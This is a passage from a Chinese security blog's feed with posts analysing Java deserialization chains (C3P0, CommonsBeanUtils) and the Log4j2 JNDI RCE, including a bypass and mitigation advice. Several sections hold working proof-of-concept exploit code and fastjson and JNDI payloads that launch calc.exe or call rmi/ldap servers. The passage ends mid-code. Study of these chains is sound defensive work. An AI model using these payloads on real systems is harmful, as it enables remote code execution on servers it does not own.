org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">c3p</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        PriorityQueue a = go();</span><br><span class="line">        ObjectOutputStream ser0 = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(<span class="string">&quot;a.bin&quot;</span>)));</span><br><span class="line">        ser0.writeObject(a);</span><br><span class="line">        ser0.close();</span><br><span class="line"></span><br><span class="line">        InputStream in = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;a.bin&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] bytein = toByteArray(in);</span><br><span class="line">        String Hex = <span class="string">&quot;HexAsciiSerializedMap:&quot;</span>+bytesToHexString(bytein,bytein.length)+<span class="string">&quot;p&quot;</span>;</span><br><span class="line">        WrapperConnectionPoolDataSource exp = <span class="keyword">new</span> WrapperConnectionPoolDataSource();</span><br><span class="line">        exp.setUserOverridesAsString(Hex);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream ser = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(<span class="string">&quot;b.bin&quot;</span>)));</span><br><span class="line">        ser.writeObject(exp);</span><br><span class="line">        ser.close();</span><br><span class="line">        ObjectInputStream unser = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;b.bin&quot;</span>));</span><br><span class="line">        unser.readObject();</span><br><span class="line">        unser.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> PriorityQueue <span class="title">go</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)&#125;);</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(chain);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Field field = Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(queue,comparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] toByteArray(InputStream in) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] classBytes;</span><br><span class="line">        classBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[in.available()];</span><br><span class="line">        in.read(classBytes);</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">return</span> classBytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">bytesToHexString</span><span class="params">(<span class="keyword">byte</span>[] bArray, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">        StringBuffer sb = <span class="keyword">new</span> StringBuffer(length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">            String sTemp = Integer.toHexString(<span class="number">255</span> &amp; bArray[i]);</span><br><span class="line">            <span class="keyword">if</span> (sTemp.length() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                sb.append(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            sb.append(sTemp.toUpperCase());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fastjson exp</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;b&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>,</span><br><span class="line">        <span class="string">&quot;userOverridesAsString&quot;</span>: <span class="string">&quot;HexAsciiSerializedMap:hex编码内容;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>在fastjson，jackson环境中可用，比起下文JNDI Gadget，此Gadget更适合在不出网环境下利用<br>WrapperConnectionPoolDataSource的父类中存在属性userOverridesAsString及其setter方法，setter方法会将userOverridesAsString中的包含的Hex信息转换成一个byte属性，然后将此byte属性反序列化。</p><h3 id="jndi"><a href="#jndi" class="headerlink" title="jndi"></a>jndi</h3><p>同样也是在fastjson，jackson环境中可用。jndi适用于jdk8u191以下支持reference情况。（下图引用自sanzhi师傅博客）</p><p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16095753735332.jpg"></p><p>首先JndiRefConnectionPoolDataSource类中有属性jndiname及其setter方法<br>其setter方法会调用内部的JndiRefForwardingDataSource对象的setJndiName方法，改变JndiRefForwardingDataSource#jndiname的值</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_13.png"></p><p>其次JndiRefConnectionPoolDataSource类中有LoginTimeout属性及其setter方法<br>其setter方法会调用内部WrapperConnectionPoolDataSource对象的setLoginTimeout方法，追踪后会发现来到JndiRefForwardingDataSource#setLoginTimeout</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_14.png"></p><p>我们跟进JndiRefForwardingDataSource#inner，它会调用JndiRefForwardingDataSource#dereference，再度跟进<br>此方法中会根据JndiRefForwardingDataSource#jndiName属性进行lookup问询，而jndiName属性从上文看是可以被JndiRefConnectionPoolDataSource#setter方法控制的。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_15.png"></p><p>那么在fastjson，jackson等环境下，调用JndiRefConnectionPoolDataSource类的jndiname，logintimeout属性setter方法，向jndiname传入恶意RMI服务器地址，然后调用logintimeout的setter方法使受害机去lookup设置好的jndiname中的恶意地址，造成JNDI注入。</p><h4 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">c3p</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        JndiRefConnectionPoolDataSource exp = <span class="keyword">new</span> JndiRefConnectionPoolDataSource();</span><br><span class="line">        exp.setJndiName(<span class="string">&quot;rmi://127.0.0.1:10099/exp&quot;</span>);</span><br><span class="line">        exp.setLoginTimeout(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fastjson exp:</span><br><span class="line">String poc = <span class="string">&quot;&#123;\&quot;object\&quot;:[\&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource\&quot;,&#123;\&quot;jndiName\&quot;:\&quot;rmi://localhost:8088/Exploit\&quot;, \&quot;loginTimeout\&quot;:0&#125;]&#125;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><p>在fastjson，jackson等环境下，调用JndiRefConnectionPoolDataSource类的jndiname，logintimeout属性setter方法，向jndiname传入恶意RMI服务器地址，然后调用logintimeout的setter方法使受害机去lookup设置好的jndiname中的恶意地址，造成JNDI注入。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;C3P0链&quot;&gt;&lt;a href=&quot;#C3P0链&quot; class=&quot;headerlink&quot; title=&quot;C3P0链&quot;&gt;&lt;/a&gt;C3P0链&lt;/h1&gt;&lt;h1 id=&quot;C3P0？&quot;&gt;&lt;a href=&quot;#C3P0？&quot; class=&quot;headerlink&quot; title=&quot;C3P</summary>
      
    
    
    
    
    <category term="java开发与安全" scheme="http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>浅析Log4j2Rce</title>
    <link href="http://const27.com/2022/03/02/Log4j2%20RCE/"/>
    <id>http://const27.com/2022/03/02/Log4j2%20RCE/</id>
    <published>2022-03-01T17:47:27.283Z</published>
    <updated>2022-03-01T17:48:10.709Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Log4j2-RCE"><a href="#Log4j2-RCE" class="headerlink" title="Log4j2 RCE"></a>Log4j2 RCE</h1><p>本质上是一个JNDI注入，屌得一批，之前掀起大热。</p><h1 id="Log4j"><a href="#Log4j" class="headerlink" title="Log4j?"></a>Log4j?</h1><p>简单点，就是一个拿来打印日志的库，Log4j2是Log4j超级增强版。</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220302014535.png"></p><blockquote><p>影响范围 Java类产品：Apache Log4j 2.x &lt; 2.15.0-rc2 受影响的应用及组件（包括但不限于）如下：Apache Solr、Apache Flink、Apache Druid、Apache Struts2、pring-boot-strater-log4j2等。（来自腾讯云社区）</p></blockquote><p>建立一个servlet（嫖自腾讯云社区）</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(name = &quot;ServletDemo&quot;, value = &quot;/ServletDemo&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServletDemo</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;  </span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;  </span><br><span class="line">          Logger logger = LogManager.getLogger(ServletDemo.class.getName());  </span><br><span class="line">          PrintWriter printWriter = response.getWriter();  </span><br><span class="line">          printWriter.println(<span class="string">&quot;Log4j2 JNDI injection&quot;</span>);  </span><br><span class="line">          String payload  = request.getParameter(<span class="string">&quot;msg&quot;</span>);  </span><br><span class="line"><span class="keyword">if</span> (payload == <span class="keyword">null</span>)&#123;  </span><br><span class="line">              payload = <span class="string">&quot;input msg parameter: ?msg=helloworld&quot;</span>;  </span><br><span class="line">          &#125;  </span><br><span class="line">          printWriter.println(<span class="string">&quot;execute paylaod: &quot;</span> + payload);  </span><br><span class="line">          logger.error(payload);  </span><br><span class="line">          printWriter.flush();  </span><br><span class="line">          printWriter.close();  </span><br><span class="line">      &#125;  </span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;  </span><br><span class="line">          Logger logger = LogManager.getLogger(ServletDemo.class.getName());  </span><br><span class="line">          PrintWriter printWriter = response.getWriter();  </span><br><span class="line">          printWriter.println(<span class="string">&quot;Log4j2 JNDI injection&quot;</span>);  </span><br><span class="line">          String payload  = request.getParameter(<span class="string">&quot;msg&quot;</span>);  </span><br><span class="line"><span class="keyword">if</span> (payload == <span class="keyword">null</span>)&#123;  </span><br><span class="line">              payload = <span class="string">&quot;input msg parameter: ?msg=helloworld&quot;</span>;  </span><br><span class="line">          &#125;  </span><br><span class="line">          printWriter.println(<span class="string">&quot;execute paylaod: &quot;</span> + payload);  </span><br><span class="line">          logger.error(payload);  </span><br><span class="line">          printWriter.flush();  </span><br><span class="line">          printWriter.close();  </span><br><span class="line">      &#125;  </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>正常运行时，logger.error会把日志输出到服务器面板。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220302014544.png"></p><p>我们跟进一下这个logger.error。<br>下断点，调试开搞。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220302014548.png"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220302014552.png"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220302014556.png"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220302014600.png"></p><p>先调用logIfEnabled函数判断当前事件类型的优先级，如果优先级不够就不会进行之后的代码操作</p><blockquote><p>日志级别</p></blockquote><p>log4j2作为一个日志处理组件，它对日志事件的优先级进行了分类以方便后续的处理<br>其内置的日志级别标准如下，各个级别（intLevel）由数值表示，级别越高数值越小。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220302014605.png"></p><p>在上面对logIfEnabled的跟进过程中我们可以看到，只有当intLevel &gt;= level.intLevel()，即当前事件的intLevel小于intLevel常量值时才会继续进行代码。<br>而默认的intLevel常量值为200，即error级别，这就意味着在默认情况下只有优先级大于等于error的事件才会继续执行代码，启用日志打印。（本文是用的logger.error触发，所以同理也可以用logger.fatal触发）<br>这个intLevel常量值可以通过配置文件和Configurator.setLevel函数进行修改，这里就不再赘述。</p><p>将断点断在<code>org/apache/logging/log4j/core/appender/AbstractOutputStreamAppender.java</code>中的<code>directEncodeEvent</code>，继续调试</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220302014609.png"></p><blockquote><p>模式布局</p></blockquote><p>这里的getLayout方法会获取日志打印的模式布局，也就是日志的格式化形式。 默认的模式布局为%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %level %logger{36} - %msg%n，也就是上图中的那样。<br>当在解析这串格式化字符串时时，会结合<code>List&lt;PatternConverter&gt;</code>转换器列表和<code>List&lt;FormattingInfo&gt;</code>格式信息列表这两个列表进行格式化。<br>格式化字符串中我们可以看到有如%d，%t等一系列占位符，这些占位符的意义是用于标识转换器，表示当前位置的字符串应该由何种转换器处理。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220302014614.png"></p><p>接下来我们跟进encode方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220302014618.png"></p><p>toSerializable方法中会先获取<code>PatternConverter</code> 转换器列表，然后用不同的转换器处理传入的数据</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220302014623.png"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220302014628.png"></p><p>log4j2 rce是MessagePatternConverter这个转换器出了问题，所以我们快进到MessagePatternConverter#format<br>它最开始会先去获得当前event信息中的message信息<br>然后在后面判断config与noLookups属性的状况<br>再然后（重点）去判断msg信息中是否存在字符串“${”，如果存在就会把$及后面的字符串切割出来存放到变量value中，于132行将其作为参数传入replace方法<br>最终传入到InitialContext.lookup参数中，完成jndi注入</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220302014633.png"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220302014639.png"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220302014644.png"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在log4j2中如果触发了error级别以上的事件，log4j2会调用不同转换器去分析事件用于格式化输出的日志，在MessagePatternConverter这个转换器中会去获取事件中的message信息（也就是传入logger.error等函数中的String参数）进行处理，如果message信息中存在”${“字符串，就会根据${}中内容的prefix选取对应的Lookup处理器进行处理，如果是prefix是jndi就会造成jndi注入</p><h2 id="2-15-0-RC1绕过"><a href="#2-15-0-RC1绕过" class="headerlink" title="2.15.0 RC1绕过"></a>2.15.0 RC1绕过</h2><p>前提条件：目标环境的log4j2配置文件中的%msg改成了%msg{lookup} ，或者通过API动态修改启用了lookup<br>just like this</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;Configuration status=<span class="string">&quot;WARN&quot;</span>&gt;</span><br><span class="line">    &lt;Appenders&gt;</span><br><span class="line">        &lt;Console name=<span class="string">&quot;Console&quot;</span> target=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span><br><span class="line">            &lt;PatternLayout pattern=<span class="string">&quot;[%-level]%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg&#123;lookups&#125;%n&quot;</span>/&gt;</span><br><span class="line">        &lt;/Console&gt;</span><br><span class="line">    &lt;/Appenders&gt;</span><br><span class="line">    &lt;Loggers&gt;</span><br><span class="line">        &lt;Root level=<span class="string">&quot;info&quot;</span>&gt;</span><br><span class="line">            &lt;AppenderRef ref=<span class="string">&quot;Console&quot;</span>/&gt;</span><br><span class="line">        &lt;/Root&gt;</span><br><span class="line">    &lt;/Loggers&gt;</span><br><span class="line">&lt;/Configuration&gt;</span><br></pre></td></tr></table></figure><p>但这个前提条件属实苛刻，所以这个绕过也属实有点鸡肋。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">$&#123;jndi:ldap:<span class="comment">//xxx.xxx.xxx.xxx:xxxx/ ExportObject&#125;  在host/后加了个空格</span></span><br></pre></td></tr></table></figure><p>简要分析过程：在进行jndilookup操作时，会判断host是否是白名单里的host(均为内网ip或域名)，如果我们在host/后加一个空格，就会导致其校验函数抛出错误，但是抛出错误后程序并没有进行相应处理，导致最后进行了成功lookup</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220302014650.png"></p><blockquote><p>修复建议</p></blockquote><p>（引用自安全客平台）</p><p>修复建议：</p><ol><li>升级Apache Log4j2所有相关应用到最新版。</li><li>升级JDK版本，建议JDK使用11.0.1、8u191、7u201、6u211及以上的高版本。但仍有绕过Java本身对Jndi远程加载类安全限制的风险。</li></ol><p>临时建议：</p><ol><li>jvm中添加参数 -Dlog4j2.formatMsgNoLookups=true <strong>（版本&gt;=2.10.0）</strong></li><li>新建log4j2.component.properties文件，其中加上配置log4j2.formatMsgNoLookups=true <strong>（版本&gt;=2.10.0）</strong></li><li>设置系统环境变量：LOG4J_FORMAT_MSG_NO_LOOKUPS=true <strong>（版本&gt;=2.10.0）</strong></li><li>对于log4j2 &lt; 2.10以下的版本，可以通过移除JndiLookup类的方式。</li></ol><h2 id="RC2修复"><a href="#RC2修复" class="headerlink" title="RC2修复"></a>RC2修复</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">&#125; <span class="keyword">catch</span> (URISyntaxException ex) &#123;</span><br><span class="line">    LOGGER.warn(<span class="string">&quot;Invalid JNDI URI - &#123;&#125;&quot;</span>, name);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> (T) <span class="keyword">this</span>.context.lookup(name);</span><br></pre></td></tr></table></figure><p>catch里直接return了。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.anquanke.com/post/id/263325#h2-6">https://www.anquanke.com/post/id/263325#h2-6</a></p><p><a href="https://cloud.tencent.com/developer/article/1917881">https://cloud.tencent.com/developer/article/1917881</a></p><p><a href="http://wjlshare.com/archives/1674">http://wjlshare.com/archives/1674</a></p><p><a href="https://xz.aliyun.com/t/10649#toc-2">https://xz.aliyun.com/t/10649#toc-2</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Log4j2-RCE&quot;&gt;&lt;a href=&quot;#Log4j2-RCE&quot; class=&quot;headerlink&quot; title=&quot;Log4j2 RCE&quot;&gt;&lt;/a&gt;Log4j2 RCE&lt;/h1&gt;&lt;p&gt;本质上是一个JNDI注入，屌得一批，之前掀起大热。&lt;/p&gt;
&lt;h1 id=&quot;</summary>
      
    
    
    
    
    <category term="java开发与安全" scheme="http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CommonsBeanUtils 反序列化</title>
    <link href="http://const27.com/2022/01/30/CommonsBeanUtils%20%E5%8F%8D%E5%BA%8F%E5%88%97/"/>
    <id>http://const27.com/2022/01/30/CommonsBeanUtils%20%E5%8F%8D%E5%BA%8F%E5%88%97/</id>
    <published>2022-01-30T14:06:55.953Z</published>
    <updated>2022-02-02T05:13:40.832Z</updated>
    
    <content type="html"><![CDATA[<p>我的博客即将同步至腾讯云+社区，邀请大家一同入驻：<a href="https://cloud.tencent.com/developer/support-plan?invite_code=g3z1bctpoyvz">https://cloud.tencent.com/developer/support-plan?invite_code=g3z1bctpoyvz</a></p><h1 id="CommonsBeanUtils-反序列化"><a href="#CommonsBeanUtils-反序列化" class="headerlink" title="CommonsBeanUtils 反序列化"></a>CommonsBeanUtils 反序列化</h1><p>在CC2这条链中，主要是通过向java.util.PriorityQueue对象传入恶意java.util.Comparator对象，导致在PriorityQueue在反序列化过程中执行了恶意java.util.Comparator的compare方法。</p><p>而java.util.Comparator实际是一个接口，我们在CC2中传入的是它的一个继承类：TransformingComparator 。那么除了TransformingComparator 以外还有没有其它能够造成反序列化攻击的java.util.Comparator实现对象呢？</p><h2 id="了解Apache-Commons-BeanUtils-的功能"><a href="#了解Apache-Commons-BeanUtils-的功能" class="headerlink" title="了解Apache Commons BeanUtils 的功能"></a>了解Apache Commons BeanUtils 的功能</h2><p>Apache Commons工具集下除了collections以外还有BeanUtils ，它主要用于操控javabean。</p><p>举个与反序列化攻击有关的操控javabean的例子。</p><p>这里直接套用p牛的例子。</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">final <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Cat</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name = <span class="string">&quot;catalina&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span>(<span class="params">String name</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们执行</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">PropertyUtils.getProperty(<span class="keyword">new</span> Cat(), <span class="string">&quot;name&quot;</span>);</span><br></pre></td></tr></table></figure><p>这个方法会调用目标类的相关属性的getter方法，也就是Cat类中的getName方法，所以输出结果如下</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130220619.png"></p><h2 id="BeanUtils-与-TemplatesImpl"><a href="#BeanUtils-与-TemplatesImpl" class="headerlink" title="BeanUtils 与 TemplatesImpl"></a>BeanUtils 与 TemplatesImpl</h2><p>我们通过上面的叙述，知道了BeanUtils 如何调用目标类某属性的getter方法。</p><p>而在TemplatesImpl中有如下的链：TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses() -&gt; TransletClassLoader#defineClass() -&gt; 恶意类初始化</p><p>同时在TemplatesImpl中存在如下方法TemplatesImpl#getOutputProperties()</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130220621.png"></p><p>我们可以发现它调用了newTransformer并且是一个getter方法，所以我们可以想办法用BeanUtils的PropertyUtils#getProperty调用该方法从而开启TemplatesImpl链，从而执行恶意字节码。</p><p>BeanUtils存在如下包 org.apache.commons.beanutils.BeanComparator，它继承自java.util.Comparator接口，所以实现了compare方法：</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130220624.png"></p><p>如果传入两个对象时 this.property不为空，就会分别对两个对象调用PropertyUtils.getProperty从而触发其对应getter方法。</p><p>由此来看，我们可以创建一个BeanComparator类，通过反射等手段将其property属性改成OutputProperties，再使其加载进java.util.PriorityQueue，在java.util.PriorityQueue反序列化时自动调用BeanComparator#compare，这个时候想办法将传入该方法的对象改成恶意TemplatesImpl，使PropertyUtils.getProperty触发getOutputProperties这个getter方法，即可达到恶意字节码执行的效果。</p><p>光说肯定会觉得抽象，下面直接上代码，其中大部分内容与CC2重合，重合部分的描述因此略过。</p><h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.<span class="keyword">internal</span>.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xalan.<span class="keyword">internal</span>.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.<span class="keyword">internal</span>.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import javassist.*;</span><br><span class="line">import org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Main</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span>(<span class="params">Object obj, String fieldName, Object <span class="keyword">value</span></span>) throws Exception</span> &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.<span class="keyword">set</span>(obj, <span class="keyword">value</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] args</span>) throws Exception</span> &#123;</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet.<span class="keyword">class</span>));</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        String cmd = <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        <span class="comment">//cc.writeFile();</span></span><br><span class="line">        cc.setSuperclass(pool.<span class="keyword">get</span>(AbstractTranslet.<span class="keyword">class</span>.getName()));</span><br><span class="line">        <span class="built_in">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="built_in">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="built_in">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        